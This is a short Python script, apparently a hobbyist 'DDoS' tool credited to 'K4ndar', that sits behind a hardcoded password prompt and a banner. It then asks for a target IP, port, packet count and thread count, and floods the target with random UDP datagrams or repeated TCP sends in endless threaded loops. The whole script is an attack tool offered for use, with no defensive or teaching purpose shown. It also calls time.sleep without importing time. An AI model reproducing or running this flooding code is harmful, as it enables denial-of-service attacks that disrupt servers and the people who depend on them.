#!/usr/bin/env python3
#remake by K4ndar
#Author is K4ndar
import random
import socket
import threading
import os
password ='k4ndar147'

os.system("clear")
for i in range(3):
    pwd = input("[=>] Enter Account : ")
    j=3
    if(pwd==password):
        time.sleep(4)
        print("[+] Wait A Moment!!! ")
        break
    else:
        time.sleep(5)
        print("[=>] Wrong Account!!! ")
        continue
time.sleep(5)
print("[@] Login Successful")
time.sleep(5)

os.system("clear")
print("""\x1b[1;92m
██╗░░██╗░░██╗██╗███╗░░██╗██████╗░░█████╗░██████╗░
██║░██╔╝░██╔╝██║████╗░██║██╔══██╗██╔══██╗██╔══██╗
█████═╝░██╔╝░██║██╔██╗██║██║░░██║███████║██████╔╝
██╔═██╗░███████║██║╚████║██║░░██║██╔══██║██╔══██╗
██║░╚██╗╚════██║██║░╚███║██████╔╝██║░░██║██║░░██║
╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
""")

print       (" - - > TOOLS INFORMATION < - - ")
print       (" - - > CREATOR : Kandar < - - ")
print       (" - - > DISCORD : Iskandar#2007<- - ")                                   
print       (" - - > DM ME IF YOU NEED HELP < - - ")


ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Want Ddos?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
os.system("clear")
def run():
	data = random._urandom(1800)
	i = random.choice(("[=>]","[<=]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" K4NDAR ATTACKED IP %s AND THROUGH THE PORT %s"%(ip,port))
		except:
			print("[!] ERROR SERVER TIME OUT")

def run2():
	data = random._urandom(18)
	i = random.choice(("[=>]","[<=]","[=>]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" K4NDAR ATTACKED IP %s AND THROUGH THE PORT %s"%(ip,port))
		except:
			s.close()
			print("[*] ERROR SERVER TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
